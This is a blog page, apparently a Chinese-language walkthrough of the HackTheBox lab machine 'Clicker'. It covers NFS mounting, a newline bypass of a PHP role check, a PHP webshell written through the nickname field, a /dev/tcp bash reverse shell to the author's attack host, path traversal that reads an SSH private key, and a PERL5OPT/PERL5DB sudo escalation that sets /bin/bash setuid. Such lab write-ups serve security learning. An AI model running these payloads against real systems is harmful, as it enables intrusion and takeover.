@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="session伪造、perl_startup提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Clicker">
+<meta property="og:url" content="https://sun-zzz.github.io/article/Clicker-HackTheBox.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="session伪造、perl_startup提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240109203146750.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240109230610834.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240109232705184.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240109233234476.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110162754718.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110164127075.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110200952730.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110165933805.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110165957356.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110170626598.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110170802276.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110170946574.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110171226227.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110172332221.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110172633202.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110172943982.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110175535438.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110190318094.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110180639183.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110184119487.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110184926380.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110185423524.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240110185919717.png">
+<meta property="article:published_time" content="2024-01-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-01T14:39:06.623Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/Clicker-HackTheBox/image-20240109203146750.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/Clicker-HackTheBox.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Clicker | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/Clicker-HackTheBox.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Clicker
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-01-10 00:00:00" itemprop="dateCreated datePublished" datetime="2024-01-10T00:00:00+08:00">2024-01-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-01 22:39:06" itemprop="dateModified" datetime="2024-09-01T22:39:06+08:00">2024-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/Clicker-HackTheBox.html" class="post-meta-item leancloud_visitors" data-flag-title="Clicker" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/Clicker-HackTheBox.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/Clicker-HackTheBox.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>session伪造、perl_startup提权</p>
+<span id="more"></span>
+
+
+
+<h1 id="Clicker"><a href="#Clicker" class="headerlink" title="Clicker"></a>Clicker</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -v -p- --min-rate 1000 10.10.11.232</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Clicker-HackTheBox/image-20240109203146750.png"></p>
+<p>扫描结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu)) //重定向</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br></pre></td></tr></table></figure>
+
+<p>我们往下看发现启用了nfs协议</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240109230610834.png"></p>
+<p>去网上查询下相关资料 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/607202498?utm_id=0">参考文章</a></p>
+<blockquote>
+<p>NFS最大的功能就是可以透过网络，让不同的机器、不同的操作系统、可以彼此分享个别的档案(share  files)。所以，你也可以简单地将它看做是一个文件服务器(file  server)。这个NFS服务器可以让你的PC来将网络远程的NFS服务器分享的目录，挂载到本地端的机器当中，在本地端的机器看起来，那个远程主机的目录就好像是自己的一个磁盘分区槽一样(partition)，使用上相当的便利。</p>
+</blockquote>
+<p>既然可以远程读取文件，那么我们使用mount命令将远程NFS文件系统挂载到本地目录</p>
+<p>在本地创建目录<code>mnt/nfs_file</code>，然后读取根目录文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o nolock 10.10.11.232:/ ~/test/mnt/nfs_file</span><br></pre></td></tr></table></figure>
+
+<p>注：<code>-o</code>：指定挂载选项，比如读写权限、访问权限等</p>
+<p>​		<code>nolock</code> 是在挂载 NFS 文件系统时的一种选项，用于禁用文件锁定机制，使得同时进行读写操作不受文件锁定限制</p>
+<p>我们ls一下，发现zip文件</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240109232705184.png"></p>
+<p>解压发现不行，用cp命令复制到本地即可</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240109233234476.png"></p>
+<p>由于80端口出现重定向，那么我们添加域名到<code>/etc/hosts</code></p>
+<p>开始进行下一步</p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>我们在admin.php注意到有对session进行身份验证，如果验证失败则重定向到index.php</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110162754718.png"></p>
+<p>那么我们尝试得到admin的session，接着在save_game.php找到可利用的地方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">include_once(&quot;db_utils.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_SESSION[&#x27;PLAYER&#x27;]) &amp;&amp; $_SESSION[&#x27;PLAYER&#x27;] != &quot;&quot;) &#123;</span><br><span class="line">	$args = [];</span><br><span class="line">	foreach($_GET as $key=&gt;$value) &#123;</span><br><span class="line">		if (strtolower($key) === &#x27;role&#x27;) &#123;</span><br><span class="line">			// prevent malicious users to modify role</span><br><span class="line">			header(&#x27;Location: /index.php?err=Malicious activity detected!&#x27;);</span><br><span class="line">			die;</span><br><span class="line">		&#125;</span><br><span class="line">		$args[$key] = $value;</span><br><span class="line">	&#125;</span><br><span class="line">	save_profile($_SESSION[&#x27;PLAYER&#x27;], $_GET);</span><br><span class="line">	// update session info</span><br><span class="line">	$_SESSION[&#x27;CLICKS&#x27;] = $_GET[&#x27;clicks&#x27;];</span><br><span class="line">	$_SESSION[&#x27;LEVEL&#x27;] = $_GET[&#x27;level&#x27;];</span><br><span class="line">	header(&#x27;Location: /index.php?msg=Game has been saved!&#x27;);	</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>简单分析一下，可以通过foreach对GET参数进行遍历，如果<code>$key</code>不为role（不区分大小写），那么<code>$args[$key] = $value;</code>进行赋值，调用save_profile函数去更新session，修改成功则返回<code>Game has been saved!</code></p>
+<p>这里我们搜索一下<code>$_SESSION[&#39;PLAYER&#39;]</code>是怎么来的，发现是由username决定的也就是登陆者身份</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110164127075.png"></p>
+<p>那么我们可以借助GET传参<code>role=Admin</code>来更新并得到admin的session，但要绕过<code>if (strtolower($key) === &#39;role&#39;)</code>判断</p>
+<p>这里本地测试发现，利用换行符<code>%0a</code>就行了</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110200952730.png"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>我们随便注册登录后点击play进入游戏，然后save的时候抓包</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110165933805.png"></p>
+<p>放行，提示修改成功</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110165957356.png"></p>
+<p>然后退出重新登录，发现多了一个功能</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110170626598.png"></p>
+<p>点进去看看发现有四个用户</p>
+<p>有个导出表格export选项，点击得到保存的路径</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110170802276.png"></p>
+<p>访问一下</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110170946574.png"></p>
+<p>我们抓包看看保存的过程发现拓展名可控</p>
+<p>尝试修改为php成功</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110171226227.png"></p>
+<p>既然可以修改为php后缀，那么我们寻找下写马的位置。很明显，保存的数据中只有nickname可以让我们写马，而如何修改nickname的值就和刚刚修改role一样的办法</p>
+<p>点击play，然后save的时候抓包</p>
+<p>（注意<code>?</code>要url编码一下）</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110172332221.png"></p>
+<p>然后还是一样回显保存成功，那么说明成功写入马</p>
+<p>继续按照刚刚那样抓包修改导出拓展名为php，然后访问保存路径成功RCE</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110172633202.png"></p>
+<p>我们将反弹shell命令url编码一下，然后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E74%2F1028%200%3E%261%22</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110172943982.png"></p>
+<p>我们尝试访问<code>/home/jack</code>发现不行，接着在<code>/opt/manage</code>发现可疑文件</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110175535438.png"></p>
+<p>貌似是二进制文件execute_query的使用说明</p>
+<p>我们在连接的靶机开启http服务，使用wget命令下载下来该二进制文件</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110190318094.png"></p>
+<p>然后丢到ida里F5反编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  size_t v4; // rbx</span><br><span class="line">  size_t v5; // rax</span><br><span class="line">  size_t v6; // rbx</span><br><span class="line">  size_t v7; // rax</span><br><span class="line">  int v8; // [rsp+10h] [rbp-B0h]</span><br><span class="line">  char *dest; // [rsp+18h] [rbp-A8h]</span><br><span class="line">  char *name; // [rsp+20h] [rbp-A0h]</span><br><span class="line">  char *command; // [rsp+28h] [rbp-98h]</span><br><span class="line">  char s[32]; // [rsp+30h] [rbp-90h] BYREF</span><br><span class="line">  char src[88]; // [rsp+50h] [rbp-70h] BYREF</span><br><span class="line">  unsigned __int64 v14; // [rsp+A8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(0x28u);</span><br><span class="line">  if ( argc &gt; 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = atoi(argv[1]);</span><br><span class="line">    dest = (char *)calloc(0x14uLL, 1uLL);</span><br><span class="line">    switch ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 0:</span><br><span class="line">        puts(&quot;ERROR: Invalid arguments&quot;);</span><br><span class="line">        return 2;</span><br><span class="line">      case 1:</span><br><span class="line">        strncpy(dest, &quot;create.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 2:</span><br><span class="line">        strncpy(dest, &quot;populate.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 3:</span><br><span class="line">        strncpy(dest, &quot;reset_password.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 4:</span><br><span class="line">        strncpy(dest, &quot;clean.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      default:</span><br><span class="line">        strncpy(dest, argv[2], 0x14uLL);</span><br><span class="line">LABEL_10:</span><br><span class="line">        strcpy(s, &quot;/home/jack/queries/&quot;);</span><br><span class="line">        v4 = strlen(s);</span><br><span class="line">        v5 = strlen(dest);</span><br><span class="line">        name = (char *)calloc(v4 + v5 + 1, 1uLL);</span><br><span class="line">        strcat(name, s);</span><br><span class="line">        strcat(name, dest);</span><br><span class="line">        setreuid(0x3E8u, 0x3E8u);</span><br><span class="line">        if ( access(name, 4) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;File not readable or not found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          strcpy(src, &quot;/usr/bin/mysql -u clicker_db_user --password=&#x27;clicker_db_password&#x27; clicker -v &lt; &quot;);</span><br><span class="line">          v6 = strlen(src);</span><br><span class="line">          v7 = strlen(dest);</span><br><span class="line">          command = (char *)calloc(v6 + v7 + 1, 1uLL);</span><br><span class="line">          strcat(command, src);</span><br><span class="line">          strcat(command, name);</span><br><span class="line">          system(command);</span><br><span class="line">        &#125;</span><br><span class="line">        result = 0;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;ERROR: not enough arguments&quot;);</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就卡住了，于是参考下国外师傅写的<a target="_blank" rel="noopener" href="https://medium.com/@depradip_8731/clicker-htb-writeup-walkthrough-f9bc00b57dee">wp</a>是去读取了jack的id_rsa私钥</p>
+<p>这里的参数5是因为在上述代码中如果不为1234中的一个，就会执行第三个命令行参数 <code>argv[2]</code> 的内容复制到 <code>dest</code> 变量中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">default:</span><br><span class="line">    strncpy(dest, argv[2], 0x14uLL);</span><br></pre></td></tr></table></figure>
+
+<p>然后拼接文件路径，然后检查文件是否可读。如果文件不可读或者不存在，程序会输出 “File not readable or not found”。否则，将会构建一个 MySQL 命令并执行它，因为拼接的路径为<code>/home/jack/queries/</code>，所以要先返回上一级目录</p>
+<p>payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./execute_query 5 ../.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>成功读取</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110180639183.png"></p>
+<p>将这一长串保存下来命名为id_rsa</p>
+<p>由于为了确保私钥的安全性，私钥文件应该只对所有者有读写权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>然后注意OpenSSH内容格式不对，所以将三个<code>-</code>修改为五个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAAB...</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>直接ssh连接，得到user的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa jack@10.10.11.232</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Clicker-HackTheBox/image-20240110184119487.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们sudo发现有monitor.sh，然后cat看下具体内容</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110184926380.png"></p>
+<p>这里注意到两个文件<code>/usr/bin/xml_pp</code>和<code>/usr/bin/echo</code>（后者并没有什么特殊用处）</p>
+<p>而我们跟进<code>/usr/bin/xml_pp</code>发现是perl脚本运行</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110185423524.png"></p>
+<p>通过搜索得知一种名为perl_startup的提权方式 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39702">参考文章</a></p>
+<p>我们直接给monitor.sh赋予<code>/bin/bash</code>权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo PERL5OPT=-d PERL5DB=&#x27;exec &quot;chmod u+s /bin/bash&quot;&#x27; /opt/monitor.sh</span><br><span class="line">//u+s表示给user用户添加权限，即/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>然后再<code>bash -p</code>即可（用于启用特权模式（privileged mode）的一个选项，保留有效用户的特权和权限）</p>
+<p>得到root的flag</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110185919717.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"># 提权</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html" rel="prev" title="ejs默认配置之原型链污染">
+      <i class="fa fa-chevron-left"></i> ejs默认配置之原型链污染
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/Surveillance-HackTheBox.html" rel="next" title="Surveillance">
+      Surveillance <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
